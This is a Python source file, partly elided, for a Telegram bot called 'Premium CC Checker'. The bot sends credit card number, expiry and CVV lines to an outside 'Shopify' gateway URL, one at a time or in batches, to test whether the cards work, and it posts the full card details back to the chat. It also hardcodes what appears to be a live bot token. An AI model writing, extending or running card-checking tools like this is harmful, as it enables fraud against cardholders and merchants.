import telebot
from flask import Flask
import re
import threading
import time
import json
import requests
import random
import sys
import logging
from telebot.types import (InlineKeyboardMarkup, InlineKeyboardButton, 
                          ReplyKeyboardMarkup, KeyboardButton)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8228704791:AAH85VvWM1HK0-8EEiJKh533Gc3-ul5r-x8"
MAIN_ADMIN_ID = 5103348494
MAX_CARDS_PER_MCHK = 10
GATEWAY_URL = "https://chk-for-shopify.onrender.com"
# =======================================================

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/')
def health_check():
    return "🔥 Premium CC Checker is Operational", 200

@app.route('/ping')
def ping():
    return "pong", 200

class PremiumCcChecker:
    def __init__(self):
        self.bot = telebot.TeleBot(BOT_TOKEN)
        self.load_data()
        self.register_handlers()
        
        self.START_MESSAGE = """
✨🔥 *𝕊ℍ𝕆ℙ𝕀𝔽𝕐 ℙℝ𝕆 ℂℍ𝔼ℂ�𝔼ℝ 𝕍𝟚* 🔥✨

╔═══════════════════════╗
  💳 *PREMIUM CC CHECKER* 💳  
╚═══════════════════════╝

✧･ﾟ: *✧ Commands ✧* :･ﾟ✧

▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
🛠️ */chk* - Instant Single Card Check
├─ Format: `/chk 4111111111111111|12|2025|123`
└─ Checks cards in 0.5s lightning speed!

📊 */mchk* - Bulk Mass Checker 
├─ Max 10 cards per batch
└─ Supports .txt files with auto-formatting

🔐 */auth* - Authorize Users/Groups
├─ Format: `/auth user_id` (admin only)
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
💎 *VIP Access:* 
Contact @mhitzxg for 
⚡ *Elite Membership* ⚡

🌌 *Current Status:*
✅ Operational | 🚀 Turbo Mode Enabled
"""
        self.PROCESSING_ANIMATION = [
            "🔍 Analyzing Card Patterns...",
            "🔒 Verifying with Payment Gateways...",
            "🌐 Routing Through Global Nodes...",
            "⚡ Finalizing Transaction Check..."
        ]

    # ... [previous methods unchanged until clean_response] ...

    def clean_response(self, text):
        """Remove all HTML tags and unwanted formatting"""
        # First remove <pre> tags and their contents
        text = re.sub(r'<pre[^>]*>.*?</pre>', '', text, flags=re.DOTALL)
        # Then remove all other HTML tags
        text = re.sub(r'<[^>]+>', '', text)
        # Remove all backslashes (raw output only)
        text = text.replace('\\', '')
        return text.strip()

    def check_card(self, cc_line):
        try:
            url = f"{GATEWAY_URL}?lista={cc_line}"
            headers = {"User-Agent": self.generate_user_agent()}
            response = requests.get(url, headers=headers, timeout=20)
            
            # Get completely raw response without any processing
            raw_response = response.text
            
            # Only clean HTML tags and backslashes, keep everything else
            clean_result = self.clean_response(raw_response)
            
            return clean_result
        except Exception as e:
            logger.error(f"Gateway error: {e}")
            return f"❌ Gateway Error: {str(e)}"

    # ... [rest of the methods remain exactly the same] ...

    def start_mass_check(self, chat_id, cc_lines):
        total = len(cc_lines)
        approved = declined = checked = 0
        processing_delay = 1.2

        start_msg = self.bot.send_message(
            chat_id,
            f"""
╔══════════════════════╗
  🔮 *MASS CHECK INITIATED* 🔮
╚══════════════════════╝

⚡ *Premium CC Checker - V2*
📅 *Date:* {time.strftime('%Y-%m-%d %H:%M:%S')}

▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
📊 *Total Cards:* `{total}`
✅ *Approved:* `0`
❌ *Declined:* `0`
⏳ *Processing:* `0/{total}`
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰

⚙️ *System Status:* `ACTIVE`
🌐 *Gateway:* `PREMIUM SHOPIFY`
            """,
            parse_mode='Markdown'
        )

        def send_card_result(index, total, cc, result, status):
            emoji = "✅" if status == "APPROVED" else "❌"
            header = f"{emoji} *CARD {index}/{total} - {status}* {emoji}"
            
            cc_parts = cc.split('|')
            card_info = f"""
💳 *Card Number:* `{cc_parts[0]}`
📅 *Expiry:* `{cc_parts[1]}/{cc_parts[2]}`
🔒 *CVV:* `{cc_parts[3]}`

🔄 *Response:*
{result}
"""
            footer = f"""
⏱️ *Processed in:* `{random.uniform(0.8, 1.5):.2f}s`
🕒 {time.strftime('%H:%M:%S')}
⚡ *Powered by Premium CC Checker*
"""
            return f"{header}\n{card_info}\n{footer}"

        # ... [rest of the mass check method remains unchanged] ...

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def main():
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    bot = PremiumCcChecker()
    logger.info("🚀 Starting Premium CC Checker Bot")
    bot.run()

if __name__ == '__main__':
    main()
